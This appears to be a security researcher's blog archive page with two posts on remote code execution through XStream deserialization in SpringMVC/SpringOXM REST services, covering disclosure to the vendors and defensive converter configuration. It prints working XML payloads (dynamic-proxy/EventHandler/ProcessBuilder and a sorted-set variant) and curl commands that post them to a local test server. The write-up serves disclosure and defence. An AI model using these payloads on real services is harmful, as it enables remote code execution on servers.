<p>So SpringMVC will handle the XML document to the SpringOXM wrapper for unmarshalling. SpringOXM uses the <strong>XStreamMarshaller</strong> so it will simply call <strong>XStream</strong> in order to unmarshall the <strong>Contact</strong> object. At this point and with the details provided in the <a href="http://www.pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization/">XStream RCE post</a> its game over.</p>

<p>Use maven and jetty to start the server:  </p>

<pre><code class="language-lang-bash line-numbers ">mvn -Djetty.port=8080 -DDebug clean jetty:run  
</code></pre>

<p>Expected use:  </p>

<pre><code class="language-lang-bash line-numbers ">curl --header "content-type: application/xml" --data @contact.xml "http://localhost:8080/contacts"  
</code></pre>

<p>Exploit knowing the interface:  </p>

<pre><code class="language-lang-bash line-numbers ">curl --header "content-type: application/xml" --data @exploit.xml "http://localhost:8080/contacts"  
</code></pre>

<p>Generic Exploit:  </p>

<pre><code class="language-lang-bash line-numbers ">curl --header "content-type: application/xml" --data @exploit2.xml "http://localhost:8080/contacts"  
</code></pre>

<h2 id="whattodoaboutit">What to do about it</h2>

<p>When I reported the issue to the Spring Security Team they updated their documentation and they added a CatchAllConverter for the users to use if they wish:</p>

<p>Documentation changes:</p>

<ul>
<li><a href="https://github.com/SpringSource/spring-framework/commit/4da7e304b86c9528d05b51b02459ee071b65e68a#spring-oxm/src/main/java/org/springframework/oxm/xstream/XStreamMarshaller.java">https://github.com/SpringSource/spring-framework/commit/4da7e304b86c9528d05b51b02459ee071b65e68a#spring-oxm/src/main/java/org/springframework/oxm/xstream/XStreamMarshaller.java</a></li>
<li><a href="https://github.com/SpringSource/spring-framework/commit/5311e84c64cb453e3779a4f235c5030b7c569edd#spring-oxm/src/main/java/org/springframework/oxm/xstream">https://github.com/SpringSource/spring-framework/commit/5311e84c64cb453e3779a4f235c5030b7c569edd#spring-oxm/src/main/java/org/springframework/oxm/xstream</a></li>
<li><a href="https://github.com/SpringSource/spring-framework/commit/d9bfac393bc8f2df93a29cf685e7d81c222a59e7#spring-oxm/src/main/java/org/springframework/oxm/xstream">https://github.com/SpringSource/spring-framework/commit/d9bfac393bc8f2df93a29cf685e7d81c222a59e7#spring-oxm/src/main/java/org/springframework/oxm/xstream</a></li>
</ul>

<p>Jira ticket to create a new <strong>CatchAllConverter</strong>:</p>

<ul>
<li><a href="https://jira.springsource.org/browse/SPR-10821?page=com.googlecode.jira-suite-utilities:transitions-summary-tabpanel">https://jira.springsource.org/browse/SPR-10821?page=com.googlecode.jira-suite-utilities:transitions-summary-tabpanel</a></li>
</ul>

<blockquote>
  <p>The main purpose of the catch-all converter class is to register itself as a catchall last converter with normal (or higher) priority, after converters that support specific domain classes. That way default XStream converters with lower priorities and <strong>possible security vulnerabilities</strong> do not get invoked.</p>
</blockquote>

<p>They added the catch-all converter which is great but they did not register it by default so unless your XStreamMarshaller config looks the following, you will be in trouble:</p>

<pre><code class="language-lang-markup line-numbers ">&lt;!-- Marshaller configuration --&gt;  
&lt;bean id="marshallingHttpMessageConverter" class="org.springframework.http.converter.xml.MarshallingHttpMessageConverter"&gt;  
    &lt;property name="marshaller" ref="xstreamMarshaller"/&gt;
    &lt;property name="unmarshaller" ref="xstreamMarshaller"/&gt;
&lt;/bean&gt;

&lt;bean id="xstreamMarshaller" class="org.springframework.oxm.xstream.XStreamMarshaller"&gt;  
    &lt;property name="aliases"&gt;
        &lt;props&gt;
            &lt;prop key="contact"&gt;org.pwntester.springserver.ContactImpl&lt;/prop&gt;
        &lt;/props&gt;
    &lt;/property&gt;
    &lt;property name="converters"&gt;
        &lt;list&gt;
            &lt;bean class="org.springframework.oxm.xstream.CatchAllConverter"/&gt;
            &lt;bean class="org.pwntester.springserver.ContactConverter"/&gt;
        &lt;/list&gt;
    &lt;/property&gt;
&lt;/bean&gt;  
</code></pre>

<p>Please note that Spring documentation is wrong and the "CatchAllConverter" needs to be registered in the first place so it gets lower priority as showed in the <a href="http://grepcode.com/file/repo1.maven.org/maven2/org.springframework.ws/spring-ws/1.5.10/org/springframework/oxm/xstream/XStreamMarshaller.java#XStreamMarshaller.setConverters%28org.springframework.oxm.xstream.ConverterMatcher%5B%5D%29">XStreamMarshaller.setConverters</a> code and not in the last place as suggested by the documentation:</p>

<pre><code class="language-lang-java line-numbers ">    public void  [More ...] setConverters(ConverterMatcher[] converters) {
        for (int i = 0; i &lt; converters.length; i++) {
            if (converters[i] instanceof Converter) {
                getXStream().registerConverter((Converter) converters[i], i);
            }
            else if (converters[i] instanceof SingleValueConverter) {
                getXStream().registerConverter((SingleValueConverter) converters[i], i);
            }
            else {
                throw new IllegalArgumentException("Invalid ConverterMatcher [" + converters[i] + "]");
            }
        }
    }
</code></pre>

<p>So summing up, if you are using XStream marshaller in your SpringMVC web service and havent set any Catch-All Converter, you are screwed. But it has an easy (undocumented) solution:</p>

<ul>
<li>Write a custom converter for each of the classes you are expecting</li>
<li>Register a <strong>CatchAllConverter</strong> followed by your custom converters in the <strong>XStreamMarshaller</strong> configuration.</li>
</ul>

<p>Thanks for reading!</p>
    </section>
</article>


<article class="post tag-java tag-exploit tag-rce39 tag-xstream">
    <header class="post-header">
        <span class="post-meta"><time datetime="2013-12-23">23 Dec 2013</time> on <a href="../java/">Java</a>, <a href="../exploit/">Exploit</a>, <a href="index.html">RCE</a>, <a href="../xstream/">XStream</a></span>
        <h2 class="post-title"><a href="../../blog/2013/12/23/rce-via-xstream-object-deserialization38/">RCE via XStream object deserialization</a></h2>

    </header>
    <section class="post-content">
        <p>When researching <a href="http://www.pwntester.com/blog/2013/08/23/springmvc-vulnerable-to-xxe/">SpringMVC RESTful APIs and their XXE vulnerabilities</a> I found that <a href="http://xstream.codehaus.org/index.html">XStream</a> was not vulnerable to XXE because it ignored the <strong>&lt;DOCTYPE /&gt;</strong> blocks. Curious about it I decided to took a deeper look at XStream and found out that its not just a simple marshalling library as JAXB but a much more powerful serializing library capable of serializing to an XML representation really complex types and not just POJOs. I took a look at the list of <a href="http://xstream.codehaus.org/converters.html">XStream converters</a> and found the following interesting one:</p>

<p><img src="../../content/images/octopress/reflectionconverter.png" alt=""></p>

<p>As stated by the XStream documentation:</p>

<blockquote>
  <p>The dynamic proxy itself is not serialized, however the interfaces it implements and the actual InvocationHandler instance are serialized. This allows the proxy to be reconstructed after deserialization.</p>
</blockquote>

<p>This allow us to send an XML representation of a dynimic proxy where the InvocationHandler will be XStream serialized. The XML representation will look something like:</p>

<pre><code class="language-lang-markup line-numbers "> &lt;dynamic-proxy&gt;
  &lt;interface&gt;com.foo.Blah&lt;/interface&gt;
  &lt;interface&gt;com.foo.Woo&lt;/interface&gt;
  &lt;handler class="com.foo.MyHandler"&gt;
    &lt;something&gt;blah&lt;/something&gt;
  &lt;/handler&gt;
&lt;/dynamic-proxy&gt;  
</code></pre>

<p>So for those not familiar with a dynamic proxy, lets say that is a way to intercept any call to an interface declared method so that when the method is invoked on the proxified interface we can hook the method call and inject any custom code.</p>

<p><img src="../../content/images/octopress/proxy.png" alt=""></p>

<p>The <strong>InvocationHandler</strong> will be the responsable to handle the intercepted call. For our exploit we will be using <a href="http://docs.oracle.com/javase/7/docs/api/java/beans/EventHandler.html">java.beans.EventHandler</a> that does not implement the <strong>Serializable</strong> interface so we could not use it for our <a href="http://www.pwntester.com/blog/2013/12/16/rce-through-deserialization-of-spring-defaultlistablebeanfactories-cve-2011-2894/">CVE-2011-2894 exploit</a> but that is serializable using XStream.</p>

<p>The simplest scenario is the one where the server is expecting a serialized instance that implements a given interface. Lets say that the server code looks like:</p>

<pre><code class="language-lang-java line-numbers ">@Controller
 @RequestMapping("/contacts")
 public class ContactController {
     @Autowired
     private ContactRepository contactRepository;

     @RequestMapping( method = RequestMethod.POST )
     @ResponseStatus( HttpStatus.CREATED )
      public final String create( @RequestBody Contact contact ){
         log(”Creating new contact: " + contact.getFirstName());
         contactRepository.save(contact);
         return "OK";
     }
 }
</code></pre>

<p>So the idea is to:</p>

<ul>
<li>Find out what Class the XML will be deserialized to (in this case com.company.model.Contact)</li>
<li>Create a proxy for that class</li>
<li>Intercept/hook any call to any method in the interface</li>
<li>Replace the original call with the malicious payload</li>
<li>Send the serialized version of the proxy</li>
<li>Cross-fingers</li>
<li>Profit</li>
</ul>

<p>So this is what our server application was expecting:</p>

<pre><code class="language-lang-markup line-numbers ">&lt;contact&gt;  
    &lt;id&gt;1&lt;/id&gt;
    &lt;firstName&gt;alvaro&lt;/firstName&gt;
    &lt;lastName&gt;munoz&lt;/lastName&gt;
    &lt;email&gt;alvaro@pwntester.com&lt;/email&gt;
&lt;/contact&gt;  
</code></pre>

<p>And this is what we will send in order to execute any arbitrary payload:</p>

<pre><code class="language-lang-markup line-numbers ">&lt;dynamic-proxy&gt;  
&lt;interface&gt;com.company.model.Contact&lt;/interface&gt;  
&lt;handler class="java.beans.EventHandler"&gt;  
    &lt;target class="java.lang.ProcessBuilder"&gt;
    &lt;command&gt;&lt;string&gt;/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt;&lt;/command&gt;
    &lt;/target&gt;
    &lt;action&gt;start&lt;/action&gt;
&lt;/handler&gt;  
&lt;/dynamic-proxy&gt;  
</code></pre>

<p>As you can see we are defining a <strong>dynamic proxy</strong> for the "com.company.model.Contact" interface and intercepting any method call on that interface with a "java.beans.EventHandler" invocation handler. This handler will replace the original method call with a call to "java.lang.ProcessBuilder.start("/Applications/Calculator.app/Contents/MacOS/Calculator")".</p>

<p>Convenient, isn't it?</p>

<p>So as soon as the server code reaches a method call on the proxified interface like the following line on our example controller:</p>

<pre><code class="language-lang-java line-numbers ">log(”Creating new contact: " + contact.getFirstName());  
</code></pre>

<p>The method call will be intercepted and replaced with our payload and the result will be a malicious calculator running on the server :)</p>

<p><img src="../../content/images/octopress/calc.png" alt=""></p>

<h2 id="increasingthesuccesslikelihood">Increasing the success likelihood</h2>

<p>Finding out what Class the server is expecting can be difficult and we also have the limitation that the class needs to implements an interface. How many applications have you seen using interfaces for POJO DTOs?? A solution for this problem is to serialize an object that contains other objects and that in order to instantiate this object, a call to an interface method has to be made. This is where we will be able to inject our malicious code using an <strong>InvocationHandler</strong>. The original idea by <strong>Jörg Schaible</strong> (XStream developer) was proposed during the disclosure to the XStream team and can be found <a href="https://www.mail-archive.com/user@xstream.codehaus.org/msg00605.html">here</a>. This variant consists on serializing a <a href="http://docs.oracle.com/javase/6/docs/api/java/util/TreeSet.html">java.util.TreeSet</a> containg different objects implementing the <a href="http://docs.oracle.com/javase/7/docs/api/java/lang/Comparable.html">java.lang.Comparable</a> interface so that when the <strong>Set</strong> is instantiated on the server side, the <strong>Comparable</strong> interface methods are called to sort the <strong>Set</strong>. All we have to do now is to add a dynamic proxy intercepting any method call to the <strong>Comparable</strong> interface and replacing it with our payload:</p>

<pre><code class="language-lang-java line-numbers ">Set&lt;Comparable&gt; set = new TreeSet&lt;Comparable&gt;();  
set.add("foo");  
set.add(EventHandler.create(Comparable.class, new ProcessBuilder("open","/Applications/Calculator.app"), "start"));  
</code></pre>

<p>If we try to serialize it using XStream <strong>toXML</strong> it will throw a Cast exception and we wont be able to get the serialized version:</p>

<pre><code class="language-lang-java line-numbers ">Set&lt;Comparable&gt; set = new TreeSet&lt;Comparable&gt;();  
set.add("foo");  
set.add(EventHandler.create(Comparable.class, new ProcessBuilder("/Applications/Calculator.app/Contents/MacOS/Calculator"), "start"));  
String payload = xstream.toXML(set);  
System.out.println(payload);  
</code></pre>

<p>Will throw:</p>

<pre><code class="language-lang-bash line-numbers ">Exception in thread "main" java.lang.ClassCastException: java.lang.UNIXProcess cannot be cast to java.lang.Integer  
  at com.sun.proxy.$Proxy4.compareTo(Unknown Source)
  at java.util.TreeMap.put(TreeMap.java:560)
  at java.util.TreeSet.add(TreeSet.java:255)
  at com.pwntester.xstreampoc.Main.main(Main.java:26)
  at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
  at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
  at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
  at java.lang.reflect.Method.invoke(Method.java:601)
  at com.intellij.rt.execution.application.AppMain.main(AppMain.java:120)
</code></pre>

<p>That will also happen during the deserialization process but at least we will be able to execute our payload. <br>
Anyway, we will need to craft the payload by hand and we will get something like:</p>

<pre><code class="language-lang-markup line-numbers ">&lt;sorted-set&gt;  
  &lt;string&gt;foo&lt;/string&gt;
  &lt;dynamic-proxy&gt;
    &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;
    &lt;handler class="java.beans.EventHandler"&gt;
      &lt;target class="java.lang.ProcessBuilder"&gt;
        &lt;command&gt;
          &lt;string&gt;/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt;
        &lt;/command&gt;
      &lt;/target&gt;
      &lt;action&gt;start&lt;/action&gt;
    &lt;/handler&gt;
  &lt;/dynamic-proxy&gt;
&lt;/sorted-set&gt;  
</code></pre>

<p>Now, if we deserialize this XML, we will get a Cast exception and our malicious calculator running on the server:</p>

<pre><code class="language-lang-java line-numbers ">String payload = "&lt;sorted-set&gt;" +  
        "&lt;string&gt;foo&lt;/string&gt;" +
        "&lt;dynamic-proxy&gt;" +
        "&lt;interface&gt;java.lang.Comparable&lt;/interface&gt;" +
        "&lt;handler class=\"java.beans.EventHandler\"&gt;" +
        " &lt;target class=\"java.lang.ProcessBuilder\"&gt;" +
        " &lt;command&gt;" +
        " &lt;string&gt;/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt;" +
        " &lt;/command&gt;" +
        " &lt;/target&gt;" +
        " &lt;action&gt;start&lt;/action&gt;" +
        "&lt;/handler&gt;" +
        "&lt;/dynamic-proxy&gt;" +
        "&lt;/sorted-set&gt;";

Contact c = (Contact) xstream.fromXML(payload);  
</code></pre>

<p><img src="../../content/images/octopress/calc.png" alt=""></p>

<p>You can find the whole project POC in the <a href="https://github.com/pwntester/XStreamPOC">XStream POC github repo</a></p>

<h2 id="disclosure">Disclosure</h2>

<p>I reported this issue to the XStream developers. I was wondering if there was any way to unregister the <strong>reflection</strong> converter by default. As you can see in this <a href="https://www.mail-archive.com/user@xstream.codehaus.org/msg00602.html">mail thread</a>, there was a solution. Unregistering the converter was not possible but registering a catch-all converter with higher priority than the reflection one should be possible.</p>

<p>As the XStream team argued, disabling it dy default was not an option since it was used by 99% of all projects using XStream:</p>

<blockquote>
  <blockquote>
    <blockquote>
      <p>Would it be possible to not register the reflection converters by default so only users that need them do it?
      Unfortunately no. It's one of XStream's key features that you actually can
      marshal nearly any object graph out of the box. If we drop the
      ReflectionConverter as catch all, we'll break immediately ~99% of all
      existing projects using XStream.</p>
    </blockquote>
  </blockquote>
</blockquote>

<p>I was ok with that since at least there was a way to "disable" it manually. But I saw no point on having the reflection converter on by default in SpringOXM when used for building RESTful webservices. RESTful APIs are about representation of entities and I see no point on serializing dynamic proxies to represent those entities. I got in contact with Spring Security Team and let them know the issue. Their response was that <strong>XStream</strong> should not be use for RESTFul webservices and that they wont disable the converter by default in their SpringOXM wrapper since its not only used by SpringMVC but they agreed in updating the <a href="https://github.com/spring-projects/spring-framework/pull/322/files">SpringMVC documentation</a> to reflect that <strong>XStreamMarshaller</strong> should be used at your own risk when used to build RESTful APIs.</p>

<p><img src="../../content/images/octopress/springdocs.png" alt=""></p>

<h2 id="whattodoaboutit">What to do about it</h2>

<p>Ok, so what can we do as developers to avoid this? We need to:</p>

<ul>
<li>Register a standard priority converter for the beans you are expecting in your application</li>
<li>Register a catch-all converter with higher priority than the reflection ones (low priority) and make the converter to return <strong>null</strong> on its <strong>unmarshall</strong> method so any object deserialized by the catch-all converter, will throw an exception and interrupt the converter chain before hitting the Reflection converters.</li>
</ul>

<p>Writing a custom converter is easy and its explaind in detail on the <a href="http://xstream.codehaus.org/converter-tutorial.html">XStream documentation</a>. We will be creating a custom converter for the <strong>Contact</strong> class in the <a href="https://github.com/pwntester/XStreamPOC">XStream POC</a> example presented above:</p>

<pre><code class="language-lang-java line-numbers ">package com.pwntester.xstreampoc;

import com.thoughtworks.xstream.converters.Converter;  
import com.thoughtworks.xstream.converters.MarshallingContext;  
import com.thoughtworks.xstream.converters.UnmarshallingContext;  
import com.thoughtworks.xstream.io.HierarchicalStreamReader;  
import com.thoughtworks.xstream.io.HierarchicalStreamWriter;

public class ContactConverter implements Converter {

    public boolean canConvert(Class clazz) {
        return clazz.equals(Contact.class);
    }

    public void marshal(Object value, HierarchicalStreamWriter writer, MarshallingContext context) {
        Contact contact = (Contact) value;
        writer.startNode("name");
        writer.setValue(contact.getName());
        writer.endNode();
    }

    public Object unmarshal(HierarchicalStreamReader reader, UnmarshallingContext context) {
        Contact contact = new Contact();
        reader.moveDown();
        contact.setName(reader.getValue());
        reader.moveUp();
        return contact;
    }

}
</code></pre>

<p>For the catch-all converter, we will return <strong>null</strong> when unmarshalling:</p>

<pre><code class="language-lang-java line-numbers ">package com.pwntester.xstreampoc;

import com.thoughtworks.xstream.converters.Converter;  
import com.thoughtworks.xstream.converters.MarshallingContext;  
import com.thoughtworks.xstream.converters.UnmarshallingContext;  
import com.thoughtworks.xstream.io.HierarchicalStreamReader;  
import com.thoughtworks.xstream.io.HierarchicalStreamWriter;

public class CatchAllConverter implements Converter {

    public boolean canConvert(Class clazz) {
        return true;
    }

    public void marshal(Object value, HierarchicalStreamWriter writer, MarshallingContext context) {
    }

    public Object unmarshal(HierarchicalStreamReader reader, UnmarshallingContext context) {
       return null;
    }

}
</code></pre>

<p>Ok, now before deserializing our untrusted input we have to register our new converters:</p>

<pre><code class="language-lang-java line-numbers ">XStream xstream = new XStream(new DomDriver());  
xstream.processAnnotations(Contact.class);  
xstream.registerConverter(new ContactConverter());  
xstream.registerConverter(new CatchAllConverter(), XStream.PRIORITY_VERY_LOW);  
</code></pre>

<p>We need to wrap our deserializing call within a try-catch block:</p>

<pre><code class="language-lang-java line-numbers ">try {  
        Contact expl = (Contact) xstream.fromXML(payload);
} catch (com.thoughtworks.xstream.converters.ConversionException ex) {
    System.out.println("Trying to deserialize null object. Make sure the input is not null and that your custom converters have higher priority than the Catch-All converter");
}
</code></pre>

<p>And that's pretty much it, lets run the application again with our malicious payload:</p>

<pre><code class="language-lang-markup line-numbers ">&lt;contact&gt;  
  &lt;name&gt;Alvaro&lt;/name&gt;
&lt;/contact&gt;  
Trying to deserialize null object. Make sure the input is not null and that your custom converters have higher priority than the Catch-All converter  
</code></pre>

<p>Voila!! no calculator this time!</p>

<h2 id="furtherreading">Further reading</h2>

<ul>
<li>This vulnerability was presented by <a href="http://www.linkedin.com/pub/abraham-kang/0/953/384">Abraham Kang</a>, <a href="https://twitter.com/DinisCruz%E2%80%8E">Dinis Cruz</a> and yours truly during the  <a href="http://www.slideshare.net/DinisCruz/res-ting-on-your-laurels-will-get-you-powned4-3">"RESTing On Your Laurels will Get YOu Pwned"</a> DefCon 2013 talk</li>
<li>Dinis Cruz wrote a great <a href="http://blog.diniscruz.com/2013/12/xstream-remote-code-execution-exploit.html">follow-up post</a> on his blog</li>
</ul>

<p>Thanks for reading!</p>
    </section>
</article>


<nav class="pagination" role="navigation">
    <span class="page-number">Page 1 of 1</span>
</nav>

    </main>

    <!-- You can safely delete this line if your theme does not require jQuery -->
<script type="text/javascript" src="https://code.jquery.com/jquery-1.11.3.min.js"></script>

    <script src="../../assets/js/instantclick.min.js?v=d47df0f104" data-no-instant></script>
    <script data-no-instant>InstantClick.init();</script>
    <script data-no-instant>
        InstantClick.on('change', function() {
            prism_markdown();
            Prism.highlightAll();
        });
        InstantClick.init();
    </script>

    <script type="text/javascript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'pwntester'; // required: replace example with your forum shortname
        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function () {
            var s = document.createElement('script'); s.async = true;
            s.type = 'text/javascript';
            s.src = '//' + disqus_shortname + '.disqus.com/count.js';
            (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
        }());
    </script>

    <script type="text/javascript" src="../../assets/js/prism-loader.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/prism.js?v=d47df0f104"></script>

</body>

